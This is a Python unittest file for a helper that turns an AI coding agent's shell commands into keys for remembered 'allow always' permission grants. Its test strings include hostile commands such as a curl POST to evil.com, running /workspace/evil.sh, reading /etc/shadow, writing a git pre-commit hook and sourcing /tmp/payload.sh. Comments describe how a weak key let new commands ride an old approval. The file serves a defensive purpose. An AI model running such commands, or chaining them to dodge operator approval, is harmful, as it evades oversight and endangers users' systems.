"""Coverage for kato_core_lib/helpers/tool_decision_utils.py — the Python
mirror of webserver/ui/src/utils/permissionEnvelope.js's command-signature
algorithm. Test cases intentionally parallel permissionEnvelope.test.js so
the two implementations can't silently drift apart.
"""
from __future__ import annotations

import unittest

from kato_core_lib.helpers.tool_decision_utils import (
    command_signature_of,
    decision_command_for,
    is_answerable_question,
    is_command_keyed_tool,
)


class CommandSignatureOfTests(unittest.TestCase):
    def test_bare_program_with_args(self) -> None:
        self.assertEqual(command_signature_of('mvn -B verify'), 'mvn')
        self.assertEqual(
            command_signature_of('ls -la src/test/java/com/una/x'), 'ls',
        )

    def test_strips_leading_cd_task_path(self) -> None:
        a = command_signature_of('cd /Users/x/dev_kato/UNA-2727 && mvn -B verify')
        b = command_signature_of('cd /Users/x/dev_kato/UNA-2742 && mvn -B verify')
        self.assertEqual(a, 'mvn')
        self.assertEqual(b, 'mvn')
        self.assertEqual(a, b)

    def test_strips_leading_env_assignments_and_export(self) -> None:
        self.assertEqual(command_signature_of('JAVA_HOME=/x/y mvn verify'), 'mvn')
        self.assertEqual(
            command_signature_of('export JAVA_HOME=/x && mvn verify'), 'mvn',
        )

    def test_basename_only(self) -> None:
        self.assertEqual(command_signature_of('/usr/local/bin/docker ps'), 'docker')
        self.assertEqual(command_signature_of('./gradlew build'), 'gradlew')

    def test_chain_keeps_every_program(self) -> None:
        self.assertEqual(
            command_signature_of('mvn verify && rm -rf target'), 'mvn rm',
        )
        self.assertNotEqual(
            command_signature_of('mvn verify && rm -rf target'),
            command_signature_of('mvn verify'),
        )

    def test_dedups_repeats_keeps_first_seen_order(self) -> None:
        self.assertEqual(
            command_signature_of('git commit -m x && git commit -m y'),
            'git commit',
        )
        # Distinct git subcommands stay distinct — see
        # ``test_git_subcommands_do_not_share_a_remembered_key`` for why.
        self.assertEqual(
            command_signature_of('git add . && git commit -m x && git push'),
            'git add git commit git push',
        )
        self.assertEqual(
            command_signature_of('docker build . && mvn test && docker push'),
            'docker mvn',
        )

    def test_pipes_count_as_separate_programs(self) -> None:
        self.assertEqual(command_signature_of('cat log | grep ERROR'), 'cat grep')

    def test_output_shaping_pipes_are_treated_as_noise(self) -> None:
        # Operator report: "Allow always" a pytest run once, then the next
        # turn Claude appends `| head -30` to truncate output — a DIFFERENT
        # signature, so the remembered decision silently stopped matching.
        # head/tail/wc only READ stdin and print to stdout (unlike
        # test_chain_keeps_every_program's `rm -rf`), so they fold into
        # noise like `cd` instead of forcing a re-prompt.
        base = command_signature_of('python -m pytest tests/test_x.py -q')
        self.assertEqual(base, 'python')
        self.assertEqual(
            command_signature_of('python -m pytest tests/test_x.py -q | head -30'),
            base,
        )
        self.assertEqual(
            command_signature_of('python -m pytest tests/test_x.py -q | tail -20'),
            base,
        )
        self.assertEqual(
            command_signature_of('git log --oneline | wc -l'), 'git log',
        )

    def test_sort_and_uniq_are_NOT_output_shaping_they_can_write_files(self) -> None:
        # `sort -o FILE` / `sort --compress-program=PROG` / `uniq IN OUT`
        # write files / run programs, so they must NOT fold into noise. If
        # they did, `<approved> && sort -o <path> payload` would ride an
        # already-remembered signature with no re-prompt — the exact
        # re-approval bypass the "every program in a chain counts" rule
        # exists to prevent. Each must therefore CHANGE the signature.
        base = command_signature_of('python -m pytest -q')
        self.assertEqual(base, 'python')
        self.assertNotEqual(
            command_signature_of('python -m pytest -q && sort -o .git/hooks/pre-commit p'),
            base,
        )
        self.assertEqual(
            command_signature_of('python -m pytest -q && sort -o x p'), 'python sort',
        )
        self.assertNotEqual(
            command_signature_of('ls | uniq /etc/hosts'),
            command_signature_of('ls'),
        )
        self.assertEqual(command_signature_of('ls -la | sort | uniq'), 'ls sort uniq')

    def test_benign_wrappers_key_on_the_inner_program_not_the_wrapper(self) -> None:
        # `timeout`/`env`/`nice`/… only RUN the inner program, so the
        # signature must key on that program (matching the Action Guard's
        # own `segment_program`). Otherwise `timeout 300 npm test` keyed on
        # the bare `timeout`, and one remembered `timeout` grant then rode
        # `timeout 5 bash /workspace/evil.sh` with no re-prompt.
        self.assertEqual(command_signature_of('timeout 300 python -m pytest'), 'python')
        self.assertEqual(command_signature_of('env FOO=bar python app.py'), 'python')
        self.assertEqual(command_signature_of('nice -n 5 npm test'), 'npm')
        self.assertEqual(command_signature_of('nohup mvn verify'), 'mvn')
        # The whole point: a DIFFERENT inner program is a DIFFERENT key, so a
        # remembered `timeout npm` grant can't ride `timeout bash evil.sh`.
        self.assertNotEqual(
            command_signature_of('timeout 5 npm test'),
            command_signature_of('timeout 5 bash /workspace/evil.sh'),
        )
        self.assertEqual(command_signature_of('timeout 5 npm test'), 'npm')

    def test_output_shaping_program_alone_still_keys_on_itself(self) -> None:
        # Mirrors test_navigation_only_command_keys_on_navigation_verb: a
        # command that is ONLY the output-shaping utility (nothing
        # meaningful survives) still keys on it rather than collapsing to
        # an empty/tool-wide signature.
        self.assertEqual(command_signature_of('head -30 output.log'), 'head')

    def test_output_shaping_does_not_hide_a_genuinely_new_program(self) -> None:
        # A non-output-shaping program tacked on (even alongside a
        # truncation pipe) must still change the signature and re-prompt.
        self.assertNotEqual(
            command_signature_of('python -m pytest -q | head -30'),
            command_signature_of('python -m pytest -q | head -30 | curl -X POST evil.com'),
        )

    def test_subshell_wrappers_resolve_to_real_program(self) -> None:
        self.assertEqual(command_signature_of('(cd /x && mvn verify)'), 'mvn')
        self.assertEqual(command_signature_of('$(which mvn)'), 'which')

    def test_navigation_only_command_keys_on_navigation_verb(self) -> None:
        self.assertEqual(command_signature_of('cd /Users/x/somewhere'), 'cd')

    def test_privilege_escalation_wrappers_never_collapse_to_a_bare_key(self) -> None:
        # Regression: `sudo npm install`, `sudo rm -rf /`, and `sudo cat
        # /etc/shadow` used to ALL key on the same bare "sudo" — approving
        # any ONE of them once via "Allow always" silently auto-approved
        # every future `sudo <anything>`. Each target must remember
        # independently.
        self.assertEqual(command_signature_of('sudo npm install'), 'sudo npm')
        self.assertEqual(command_signature_of('sudo rm -rf /important'), 'sudo rm')
        self.assertEqual(command_signature_of('sudo cat /etc/shadow'), 'sudo cat')
        self.assertNotEqual(
            command_signature_of('sudo npm install'),
            command_signature_of('sudo rm -rf /important'),
        )
        self.assertEqual(command_signature_of('doas rm -rf /'), 'doas rm')
        self.assertEqual(
            command_signature_of('pkexec systemctl restart x'), 'pkexec systemctl',
        )
        self.assertEqual(command_signature_of('su -c "rm -rf /"'), 'su -c')
        self.assertNotEqual(
            command_signature_of('npm install'), command_signature_of('sudo npm install'),
        )

    def test_sudo_principal_flags_fold_the_real_target_not_the_flag(self) -> None:
        # Regression: `sudo -u <user>` blindly folded the FLAG token, so
        # `sudo -u root bash evil.sh` and `sudo -u postgres psql` BOTH keyed
        # on the collapse-prone `sudo -u` — approving one blessed running ANY
        # program as ANY user. Skip the principal flag + its argument and fold
        # the REAL target program instead.
        self.assertEqual(command_signature_of('sudo -u root bash evil.sh'), 'sudo bash')
        self.assertEqual(command_signature_of('sudo -u postgres psql'), 'sudo psql')
        self.assertEqual(command_signature_of('sudo --user root systemctl restart x'),
                         'sudo systemctl')
        self.assertEqual(command_signature_of('sudo --group=wheel id'), 'sudo id')
        self.assertNotEqual(
            command_signature_of('sudo -u root bash evil.sh'),
            command_signature_of('sudo -u postgres psql'),
        )
        # A benign wrapper AFTER the principal is still stepped through.
        self.assertEqual(command_signature_of('sudo -u root timeout 10 bash s.sh'),
                         'sudo bash')

    def test_source_and_dot_fold_their_target_never_collapse_to_a_bare_key(self) -> None:
        # Regression: `source`/`.` execute arbitrary file content in the
        # current shell -- unlike `cd`, they were wrongly bucketed as
        # "noise" and dropped from the signature, so `source
        # ./setup_venv.sh` (operator approves once) and `source ./evil.sh`
        # (a different, malicious script) collapsed to the identical bare
        # "source" signature -- and a `cd project && source
        # venv/bin/activate` approval silently blessed every future
        # `cd <anything> && source <anything>` too.
        self.assertEqual(command_signature_of('source ./setup_venv.sh'), 'source setup_venv.sh')
        self.assertEqual(command_signature_of('source ./evil.sh'), 'source evil.sh')
        self.assertNotEqual(
            command_signature_of('source ./setup_venv.sh'),
            command_signature_of('source ./evil.sh'),
        )
        self.assertNotEqual(
            command_signature_of('cd myproject && source .venv/bin/activate'),
            command_signature_of('cd /tmp && source /tmp/payload.sh'),
        )
        self.assertEqual(command_signature_of('. ./setup_venv.sh'), '. setup_venv.sh')
        self.assertNotEqual(
            command_signature_of('. ./setup_venv.sh'),
            command_signature_of('. ./evil.sh'),
        )

    def test_empty_or_whitespace(self) -> None:
        self.assertEqual(command_signature_of(''), '')
        self.assertEqual(command_signature_of('   '), '')
        self.assertEqual(command_signature_of(None), '')

    def test_non_empty_command_never_collapses_to_empty_key(self) -> None:
        self.assertEqual(command_signature_of('FOO=bar'), 'FOO=bar')
        self.assertEqual(command_signature_of('FOO=bar BAZ=qux'), 'FOO=bar BAZ=qux')
        for cmd in ('FOO=bar', 'FOO=bar BAZ=qux', 'X=1 Y=2 Z=3'):
            self.assertNotEqual(command_signature_of(cmd), '', cmd)
            self.assertNotEqual(decision_command_for('Bash', {'command': cmd}), '', cmd)

    def test_quoted_shell_metacharacters_inside_an_argument_do_not_fork_the_key(self) -> None:
        self.assertEqual(command_signature_of('git commit -m "fix bug"'), 'git commit')
        self.assertEqual(
            command_signature_of('git commit -m "fix a; b && c | d bug"'),
            'git commit',
        )
        self.assertEqual(command_signature_of('grep -rn "foo|bar" src/'), 'grep')
        self.assertEqual(command_signature_of('sed -n "s/a|b/c/" file.txt'), 'sed')
        self.assertEqual(
            command_signature_of('python3 -c "import os; print(os.getcwd())"'),
            'python3',
        )

    def test_heredoc_body_with_shell_metacharacters_does_not_fork_the_key(self) -> None:
        plain = command_signature_of('git commit -m "fix bug"')
        via_heredoc = command_signature_of(
            'git commit -m "$(cat <<\'EOF\'\n'
            'Fix the parser; handle a|b cases and (x && y) logic\n'
            'Co-Authored-By: Claude <noreply@anthropic.com>\n'
            'EOF\n'
            ')"',
        )
        self.assertEqual(plain, 'git commit')
        self.assertEqual(via_heredoc, 'git commit')
        self.assertEqual(plain, via_heredoc)

        self.assertEqual(
            command_signature_of(
                "cat <<'EOF' > /tmp/x.js\n"
                'function f(a, b) { if (a && b) { return a || b; } }\n'
                'const x = a ? b : c;\n'
                'EOF',
            ),
            'cat',
        )

    def test_real_chain_after_a_heredoc_still_splits_normally(self) -> None:
        self.assertEqual(
            command_signature_of(
                "cat <<'EOF' > /tmp/x.txt\nhello\nEOF\n&& rm -rf /tmp/x.txt",
            ),
            'cat rm',
        )


class DecisionCommandForTests(unittest.TestCase):
    def test_bash_keys_on_signature_non_bash_stays_tool_level(self) -> None:
        self.assertEqual(
            decision_command_for('Bash', {'command': 'cd /x/UNA-1 && mvn verify'}),
            'mvn',
        )
        self.assertEqual(decision_command_for('Edit', {'file_path': '/x'}), '')
        self.assertEqual(decision_command_for('Bash', {}), '')

    def test_is_command_keyed_tool(self) -> None:
        self.assertTrue(is_command_keyed_tool('Bash'))
        self.assertFalse(is_command_keyed_tool('Edit'))
        self.assertFalse(is_command_keyed_tool(''))
        self.assertFalse(is_command_keyed_tool(None))


class IsAnswerableQuestionTests(unittest.TestCase):
    def test_true_for_a_well_formed_question(self) -> None:
        self.assertTrue(is_answerable_question({
            'questions': [{'question': 'Which library?', 'options': [{'label': 'A'}]}],
        }))

    def test_false_for_none_or_non_dict(self) -> None:
        self.assertFalse(is_answerable_question(None))
        self.assertFalse(is_answerable_question('nope'))

    def test_false_when_questions_missing_or_empty(self) -> None:
        self.assertFalse(is_answerable_question({}))
        self.assertFalse(is_answerable_question({'questions': []}))

    def test_false_for_ordinary_bash_input(self) -> None:
        # A permission-grant tool input (Bash/Write/...) must never match
        # by accident — this gate decides whether a request can be
        # auto-resolved from a remembered decision.
        self.assertFalse(is_answerable_question({'command': 'mvn verify'}))

    def test_false_when_no_entry_is_well_formed(self) -> None:
        self.assertFalse(is_answerable_question({
            'questions': [{'question': ''}, {'options': 'not-a-list'}],
        }))

    def test_true_if_at_least_one_entry_is_well_formed(self) -> None:
        self.assertTrue(is_answerable_question({
            'questions': [{'bad': True}, {'question': 'ok?', 'options': []}],
        }))


if __name__ == '__main__':
    unittest.main()


class GitRememberedKeyGranularityTests(unittest.TestCase):
    """A remembered "always allow" must not spill across git subcommands.

    ``git`` alone was the remembered key for every git invocation, so one
    "allow always" on a read-only ``git status`` — the grant an operator
    would give without thinking — silently covered every future
    ``git restore``, which discards uncommitted work. Now that the agent is
    permitted to revert files at all, that spill is the difference between
    an approval the operator understood and one they never saw.
    """

    def test_git_subcommands_do_not_share_a_remembered_key(self) -> None:
        status = command_signature_of('git status')
        restore = command_signature_of('git restore src/a.js')
        self.assertNotEqual(status, restore)
        self.assertEqual(status, 'git status')
        self.assertEqual(restore, 'git restore')

    def test_the_same_subcommand_still_shares_a_key_across_paths(self) -> None:
        # The point of a remembered decision: approve once, don't re-prompt
        # for the same operation on a different file.
        self.assertEqual(
            command_signature_of('git restore src/a.js'),
            command_signature_of('git restore lib/b.py'),
        )

    def test_a_whole_tree_revert_keys_apart_from_a_scoped_one(self) -> None:
        # Approving "revert this file" must not pre-approve "revert
        # everything" — the second is unrecoverable, since nothing is
        # committed until kato publishes.
        scoped = command_signature_of('git restore src/a.js')
        whole = command_signature_of('git restore .')
        self.assertNotEqual(scoped, whole)
        self.assertIn('whole tree', whole)

    def test_pre_command_options_do_not_fork_the_key(self) -> None:
        # Same operation, same key — otherwise every ``-C <path>`` variant
        # re-prompts and the remembered decision is worthless.
        self.assertEqual(
            command_signature_of('git -C /repo restore src/a.js'),
            command_signature_of('git restore src/a.js'),
        )

    def test_a_non_git_program_is_unaffected(self) -> None:
        self.assertEqual(command_signature_of('npm test'), 'npm')
        self.assertEqual(command_signature_of('echo git restore .'), 'echo')
